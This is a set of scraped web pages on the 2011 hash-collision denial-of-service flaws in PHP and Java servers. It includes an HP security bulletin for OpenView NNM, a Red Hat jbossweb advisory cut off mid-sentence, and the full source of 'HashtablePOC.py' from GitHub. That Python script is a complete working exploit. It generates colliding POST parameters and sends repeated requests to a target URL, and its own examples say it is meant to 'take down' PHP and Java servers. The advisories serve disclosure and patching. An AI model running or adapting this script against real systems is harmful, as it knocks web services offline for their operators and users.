* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from mail-archives.apache.org_7e3c92ca_20250125_074708.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.



=== Content from marc.info_b9a48f83_20250125_074711.html ===

```
[[prev in list](?l=bugtraq&m=133294318508385&w=2)] [[next in list](?l=bugtraq&m=133294460209056&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [security bulletin] HPSBMU02747 SSRT100771 rev.1 - HP OpenView Network Node Manager (OV NNM) Running
From:       [security-alert () hp ! com](?a=90366096700007&r=1&w=2)
Date:       [2012-03-28 13:55:55](?l=bugtraq&r=1&w=2&b=201203)
Message-ID: [20120328135555.6182F2241D () security ! hp ! com](?i=20120328135555.6182F2241D%20()%20security%20!%20hp%20!%20com)
[Download RAW [message](?l=bugtraq&m=133294394108746&q=mbox) or [body](?l=bugtraq&m=133294394108746&q=raw)]

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

SUPPORT COMMUNICATION - SECURITY BULLETIN

Document ID: c03231290
Version: 1

HPSBMU02747 SSRT100771 rev.1 - HP OpenView Network Node Manager (OV NNM) Running \
Apache Tomcat, Remote Denial of Service (DoS)

NOTICE: The information in this Security Bulletin should be acted upon as soon as \
possible.

Release Date: 2012-03-27
Last Updated: 2012-03-27

Potential Security Impact: Remote Denial of Service (DoS)

Source: Hewlett-Packard Company, HP Software Security Response Team

VULNERABILITY SUMMARY
Potential security vulnerabilities have been identified with HP OpenView Network Node \
Manager (OV NNM) running Apache Tomcat. The vulnerabilities could be exploited \
remotely to create a Denial of Service (DoS).

References: CVE-2012-0022, CVE-2011-4858

SUPPORTED SOFTWARE VERSIONS*: ONLY impacted versions are listed.
HP OpenView Network Node Manager (OV NNM) v7.53 running on HP-UX, Linux, and Solaris.

BACKGROUND

CVSS 2.0 Base Metrics
===========================================================
  Reference              Base Vector             Base Score
CVE-2012-0022    (AV:N/AC:L/Au:N/C:N/I:N/A:P)       5.0
CVE-2011-4858    (AV:N/AC:L/Au:N/C:N/I:N/A:P)       5.0
===========================================================
             Information on CVSS is documented
            in HP Customer Notice: HPSN-2008-002

RESOLUTION

HP has provided a hotfix to resolve the vulnerability. The SSRT100771 hotfix is \
available by contacting the normal HP Services support channel.

MANUAL ACTIONS: Yes - NonUpdate

Install the hotfix for SSRT100771.

PRODUCT SPECIFIC INFORMATION

HP-UX Software Assistant: HP-UX Software Assistant is an enhanced application that \
replaces HP-UX Security Patch Check. It analyzes all Security Bulletins issued by HP \
and lists recommended actions that may apply to a specific HP-UX system. It can also \
download patches and create a depot automatically. For more information see \
<https://www.hp.com/go/swa>

The following text is for use by the HP-UX Software Assistant.

AFFECTED VERSIONS (for HP-UX)

For HP-UX OV NNM 7.53
HP-UX B.11.31
HP-UX B.11.23 (IA)
HP-UX B.11.23 (PA)
HP-UX B.11.11
=============
OVNNMgr.OVNNM-RUN,fr=B.07.50.00
action: install the hotfix for SSRT100771

END AFFECTED VERSIONS (for HP-UX)

HISTORY
Version:1 (rev.1) - 27 March 2012 Initial release

Third Party Security Patches: Third party security patches that are to be installed \
on systems running HP software products should be applied in accordance with the \
customer's patch management policy.

Support: For issues about implementing the recommendations of this Security Bulletin, \
contact normal HP Services support channel.  For other issues about the content of \
this Security Bulletin, send e-mail to security-alert@hp.com.

Report: To report a potential security vulnerability with any HP supported product, \
send Email to: security-alert@hp.com

Subscribe: To initiate a subscription to receive future HP Security Bulletin alerts \
via Email: <http://h41183.www4.hp.com/signup_alerts.php?jumpid=hpsc_secbulletins>

Security Bulletin List: A list of HP Security Bulletins, updated periodically, is \
contained in HP Security Notice HPSN-2011-001: \
<https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c02964430>

Security Bulletin Archive: A list of recently released Security Bulletins is \
available here: <http://h20566.www2.hp.com/portal/site/hpsc/public/kb/secBullArchive/>

Software Product Category: The Software Product Category is represented in the title \
by the two characters following HPSB.

3C = 3COM
3P = 3rd Party Software
GN = HP General Software
HF = HP Hardware and Firmware
MP = MPE/iX
MU = Multi-Platform Software
NS = NonStop Servers
OV = OpenVMS
PI = Printing and Imaging
PV = ProCurve
ST = Storage Software
TU = Tru64 UNIX
UX = HP-UX

Copyright 2012 Hewlett-Packard Development Company, L.P.
Hewlett-Packard Company shall not be liable for technical or editorial errors or \
omissions contained herein. The information provided is provided "as is" without \
warranty of any kind. To the extent permitted by law, neither HP or its affiliates, \
subcontractors or suppliers will be liable for incidental,special or consequential \
damages including downtime cost; lost profits;damages relating to the procurement of \
substitute products or services; or damages for loss of data, or software \
restoration. The information in this document is subject to change without notice. \
Hewlett-Packard Company and the names of Hewlett-Packard products referenced herein \
are trademarks of Hewlett-Packard Company in the United States and other countries. \
Other product and company names mentioned herein may be trademarks of their \
                respective owners.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (GNU/Linux)

iEYEARECAAYFAk9xzvoACgkQ4B86/C0qfVkxnwCfdMnKaD1xMTP0Y/kvlgBOExuL
iPAAnAkQrExylafaMMM6BD+/uRFoAFfS
=CxxM
-----END PGP SIGNATURE-----

[[prev in list](?l=bugtraq&m=133294318508385&w=2)] [[next in list](?l=bugtraq&m=133294460209056&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from github.com_d207404c_20250125_074732.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FFireFart%2FHashCollision-DOS-POC%2Fblob%2Fmaster%2FHashtablePOC.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FFireFart%2FHashCollision-DOS-POC%2Fblob%2Fmaster%2FHashtablePOC.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=firefart%2FHashCollision-DOS-POC)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[firefart](/firefart)
/
**[HashCollision-DOS-POC](/firefart/HashCollision-DOS-POC)**
Public

* [Notifications](/login?return_to=%2Ffirefart%2FHashCollision-DOS-POC) You must be signed in to change notification settings
* [Fork
  26](/login?return_to=%2Ffirefart%2FHashCollision-DOS-POC)
* [Star
   100](/login?return_to=%2Ffirefart%2FHashCollision-DOS-POC)

* [Code](/firefart/HashCollision-DOS-POC)
* [Issues
  0](/firefart/HashCollision-DOS-POC/issues)
* [Pull requests
  0](/firefart/HashCollision-DOS-POC/pulls)
* [Actions](/firefart/HashCollision-DOS-POC/actions)
* [Projects
  0](/firefart/HashCollision-DOS-POC/projects)
* [Wiki](/firefart/HashCollision-DOS-POC/wiki)
* [Security](/firefart/HashCollision-DOS-POC/security)
* [Insights](/firefart/HashCollision-DOS-POC/pulse)

Additional navigation options

* [Code](/firefart/HashCollision-DOS-POC)
* [Issues](/firefart/HashCollision-DOS-POC/issues)
* [Pull requests](/firefart/HashCollision-DOS-POC/pulls)
* [Actions](/firefart/HashCollision-DOS-POC/actions)
* [Projects](/firefart/HashCollision-DOS-POC/projects)
* [Wiki](/firefart/HashCollision-DOS-POC/wiki)
* [Security](/firefart/HashCollision-DOS-POC/security)
* [Insights](/firefart/HashCollision-DOS-POC/pulse)

## Files

 master
## Breadcrumbs

1. [HashCollision-DOS-POC](/firefart/HashCollision-DOS-POC/tree/master)
/
# HashtablePOC.py

Copy path Blame  Blame
## Latest commit

## History

[History](/firefart/HashCollision-DOS-POC/commits/master/HashtablePOC.py)executable file·359 lines (313 loc) · 12.8 KB master
## Breadcrumbs

1. [HashCollision-DOS-POC](/firefart/HashCollision-DOS-POC/tree/master)
/
# HashtablePOC.py

Top
## File metadata and controls

* Code
* Blame

executable file·359 lines (313 loc) · 12.8 KB[Raw](https://github.com/FireFart/HashCollision-DOS-POC/raw/refs/heads/master/HashtablePOC.py)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359#! /usr/bin/env python
"""This script was written by Christian Mehlmauer <FireFart@gmail.com>https://twitter.com/#!/\_FireFart\_
Sourcecode online at:https://github.com/FireFart/HashCollision-DOS-POC
Original PHP Payloadgenerator taken from https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision
http://www.ocert.org/advisories/ocert-2011-003.htmlCVE: Apache Geronimo: CVE-2011-5034 Oracle Glassfish: CVE-2011-5035 PHP: CVE-2011-4885 Apache Tomcat: CVE-2011-4858
requires Python 2.7
Examples:-) Make a single Request, wait for the response and save the response to output0.htmlpython HashtablePOC.py -u https://host/index.php -v -c 1 -w -o output -t PHP
-) Take down a PHP server(make 500 requests without waiting for a response):python HashtablePOC.py -u https://host/index.php -v -c 500 -t PHP
-) Take down a JAVA server(tested with Tomcat and Glassfish; make 500 requests without waiting for a response, maximum POST data size 2MB):python HashtablePOC.py -u https://host/index.jsp -v -c 500 -t JAVA -m 2
Changelog:v6.0: Added Javapayloadgeneratorv5.0: Define max payload size as parameterv4.0: Get PHP Collision Chars on the flyv3.0: Load Payload from filev2.0: Added Support for https, switched to HTTP 1.1v1.0: Initial Release"""
import socketimport sysimport mathimport urllibimport stringimport timeimport urlparseimport argparseimport sslimport randomimport itertools
class Payloadgenerator: # Maximum recursions when searching for collisionchars \_recursivemax = 15 \_recursivecounter = 1  def \_\_init\_\_(self, verbose, collisionchars = 5, collisioncharlength = 2, payloadlength = 8): self.\_verbose = verbose self.\_collisionchars = collisionchars self.\_collisioncharlength = collisioncharlength self.\_payloadlength = payloadlength  def generateASPPayload(self): raise Exception("ASP Payload not implemented")  def generateJAVAPayload(self): a = self.\_computeJAVACollisionChars(self.\_collisionchars) return self.\_generatePayload(a, self.\_payloadlength)  def generatePHPPayload(self): # Note: Default max POST Data Length in PHP is 8388608 bytes (8MB) # compute entries with collisions in PHP hashtable hash function  a = self.\_computePHPCollisionChars(self.\_collisionchars) return self.\_generatePayload(a, self.\_payloadlength);  def \_computePHPCollisionChars(self, count): charrange = range(0, 256) return self.\_computeCollisionChars(self.\_DJBX33A, count, charrange)  def \_computeJAVACollisionChars(self, count): charrange = range(0, 129) return self.\_computeCollisionChars(self.\_DJBX31A, count, charrange)  def \_computeCollisionChars(self, function, count, charrange): hashes = {} counter = 0 length = self.\_collisioncharlength a = "" for i in charrange: a = a+chr(i) source = list(itertools.product(a, repeat=length)) basestr = ''.join(random.choice(source)) basehash = function(basestr) hashes[str(counter)] = basestr counter = counter + 1 for item in source: tempstr = ''.join(item) if tempstr == basestr: continue if function(tempstr) == basehash: hashes[str(counter)] = tempstr counter = counter + 1 if counter >= count: break; if counter < count: # Try it again if self.\_recursivecounter > self.\_recursivemax: print("Not enought values found. Please start this script again") sys.exit(1) print("%d: Not enough values found. Trying it again..." % self.\_recursivecounter) self.\_recursivecounter = self.\_recursivecounter + 1 hashes = self.\_computeCollisionChars(function, count, charrange) else: if self.\_verbose: print("Found values:") for item in hashes: tempstr = hashes[item] print("\tValue: %s\tHash: %s" % (tempstr, function(tempstr))) for i in tempstr: print("\t\tValue: %s\tCharcode: %d" % (i, ord(i))) return hashes  def \_DJBXA(self, inputstring, base, start): counter = len(inputstring) - 1 result = start for item in inputstring: result = result + (math.pow(base, counter) \* ord(item)) counter = counter - 1 return int(round(result))  #PHP def \_DJBX33A(self, inputstring): return self.\_DJBXA(inputstring, 33, 5381)  #Java def \_DJBX31A(self, inputstring): return self.\_DJBXA(inputstring, 31, 0)  #ASP def \_DJBX33X(self, inputstring): counter = len(inputstring) - 1 result = 5381 for item in inputstring: result = result + (int(round(math.pow(33, counter))) ^ ord(item)) counter = counter - 1 return int(round(result))  def \_generatePayload(self, collisionchars, payloadlength): # Taken from: # https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision  # how long should the payload be length = payloadlength size = len(collisionchars) post = "" maxvaluefloat = math.pow(size,length) maxvalueint = int(math.floor(maxvaluefloat)) for i in range (maxvalueint): inputstring = self.\_base\_convert(i, size) result = inputstring.rjust(length, "0") for item in collisionchars: result = result.replace(str(item), collisionchars[item]) post += urllib.urlencode({result:""}) + "&"  return post;  def \_base\_convert(self, num, base): fullalphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" alphabet = fullalphabet[:base] if (num == 0): return alphabet[0] arr = [] base = len(alphabet) while num: rem = num % base num = num // base arr.append(alphabet[rem]) arr.reverse() return "".join(arr)
def main(): parser = argparse.ArgumentParser(description="Take down a remote Host via Hashcollisions", prog="Universal Hashcollision Exploit") parser.add\_argument("-u", "--url", dest="url", help="Url to attack", required=True) parser.add\_argument("-w", "--wait", dest="wait", action="store\_true", default=False, help="wait for Response") parser.add\_argument("-c", "--count", dest="count", type=int, default=1, help="How many requests") parser.add\_argument("-v", "--verbose", dest="verbose", action="store\_true", default=False, help="Verbose output") parser.add\_argument("-s", "--save", dest="save", help="Save payload to file") parser.add\_argument("-p", "--payload", dest="payload", help="Save payload to file") parser.add\_argument("-o", "--output", dest="output", help="Save Server response to file. This name is only a pattern. HTML Extension will be appended. Implies -w") parser.add\_argument("-t", "--target", dest="target", help="Target of the attack", choices=["ASP", "PHP", "JAVA"], required=True) parser.add\_argument("-m", "--max-payload-size", dest="maxpayloadsize", help="Maximum size of the Payload in Megabyte. PHPs defaultconfiguration does not allow more than 8MB, Tomcat is 2MB", type=int) parser.add\_argument("-g", "--generate", dest="generate", help="Only generate Payload and exit", default=False, action="store\_true") parser.add\_argument("--version", action="version", version="%(prog)s 6.0")
 options = parser.parse\_args()  if options.target == "PHP": if not options.maxpayloadsize or options.maxpayloadsize == 0: maxpayloadsize = 8 else: maxpayloadsize = options.maxpayloadsize elif options.target == "ASP": if not options.maxpayloadsize or options.maxpayloadsize == 0: maxpayloadsize = 8 else: maxpayloadsize = options.maxpayloadsize elif options.target == "JAVA": if not options.maxpayloadsize or options.maxpayloadsize == 0: maxpayloadsize = 2 else: maxpayloadsize = options.maxpayloadsize else: print("Target %s not yet implemented" % options.target) sys.exit(1)
 url = urlparse.urlparse(options.url)
 if not url.scheme: print("Please provide a scheme to the URL(http://, https://,..") sys.exit(1)
 host = url.hostname path = url.path port = url.port if not port: if url.scheme == "https": port = 443 elif url.scheme == "http": port = 80 else: print("Unsupported Protocol %s" % url.scheme) sys.exit(1) if not path: path = "/"
 if not options.payload: print("Generating Payload...")  # Number of colliding chars to find collisionchars = 5 # Length of the collision chars (2 = Ey, FZ; 3=HyA, ...) collisioncharlength = 2 # Length of each parameter in the payload payloadlength = 8 generator = Payloadgenerator(options.verbose, collisionchars, collisioncharlength, payloadlength) if options.target == "PHP": payload = generator.generatePHPPayload() elif options.target == "ASP": #payload = generateASPPayload() print("Target %s not yet implemented" % options.target) sys.exit(1) elif options.target == "JAVA": payload = generator.generateJAVAPayload() else: print("Target %s not yet implemented" % options.target) sys.exit(1)
 print("Payload generated") else: f = open(options.payload, "r") payload = f.read() f.close() print("Loaded Payload from %s" % options.payload)
 # trim to maximum payload size (in MB) maxinmb = maxpayloadsize\*1024\*1024 payload = payload[:maxinmb] # remove last invalid(cut off) parameter position = payload.rfind("=&") payload = payload[:position+1]  # Save payload if options.save: f = open(options.save, "w") f.write(payload) f.close() print("Payload saved to %s" % options.save)
 # User selected to only generate the payload if options.generate: return
 print("Host: %s" % host) print("Port: %s" % str(port)) print("path: %s" % path) print print
 for i in range(options.count): print("sending Request #%s..." % str(i+1)) sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM) if url.scheme == "https": ssl\_sock = ssl.wrap\_socket(sock) ssl\_sock.connect((host, port)) ssl\_sock.settimeout(None) else: sock.connect((host, port)) sock.settimeout(None)
 request = "POST %s HTTP/1.1\r\n\Host: %s\r\n\Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n\Connection: Close\r\n\User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20 ( .NET CLR 3.5.30729; .NET4.0E)\r\n\Content-Length: %s\r\n\\r\n\%s\r\n\\r\n" % (path, host, str(len(payload)), payload)
 if url.scheme == "https": ssl\_sock.send(request) else: sock.send(request)
 if options.verbose: if len(request) > 400: print(request[:400]+"....") else: print(request) print("") if options.wait or options.output: start = time.time() if url.scheme == "https": data = ssl\_sock.recv(1024) string = "" while len(data): string = string + data data = ssl\_sock.recv(1024) else: data = sock.recv(1024) string = "" while len(data): string = string + data data = sock.recv(1024)  elapsed = (time.time() - start) print("Request %s finished" % str(i+1)) print("Request %s duration: %s" % (str(i+1), elapsed)) split = string.partition("\r\n\r\n") header = split[0] content = split[2] if options.verbose: # only print http header print("") print(header) print("") if options.output: f = open(options.output+str(i)+".html", "w") f.write("<!-- "+header+" -->\r\n"+content) f.close()
 if url.scheme == "https": ssl\_sock.close() sock.close() else: sock.close()
if \_\_name\_\_ == "\_\_main\_\_": main()

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from rhn.redhat.com_6641b368_20250125_074714.html ===

Note: Our personalized web services require that your browser be enabled for JavaScript and cookies

[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

[Red Hat Product Errata](/errata)
RHSA-2012:0076 - Security Advisory

Issued:
2012-01-31
Updated:
2012-01-31
# RHSA-2012:0076 - Security Advisory

* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Important: jbossweb security update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2012%3A0076)

## Topic

Updated jbossweb packages that fix multiple security issues are now
available for JBoss Enterprise Web Platform 5.1.2 for Red Hat Enterprise
Linux 4, 5, and 6.

The Red Hat Security Response Team has rated this update as having
important security impact. Common Vulnerability Scoring System (CVSS) base
scores, which give detailed severity ratings, are available for each
vulnerability from the CVE links in the References section.

## Description

JBoss Web is a web container based on Apache Tomcat. It provides a single
deployment platform for the JavaServer Pages (JSP) and Java Servlet
technologies.

A flaw was found in the way JBoss Web handled UTF-8 surrogate pair
characters. If JBoss Web was hosting an application with UTF-8 character
encoding enabled, or that included user-supplied UTF-8 strings in a
response, a remote attacker could use this flaw to cause a denial of
service (infinite loop) on the JBoss Web server. (CVE-2011-4610)

It was found that the Java hashCode() method implementation was susceptible
to predictable hash collisions. A remote attacker could use this flaw to
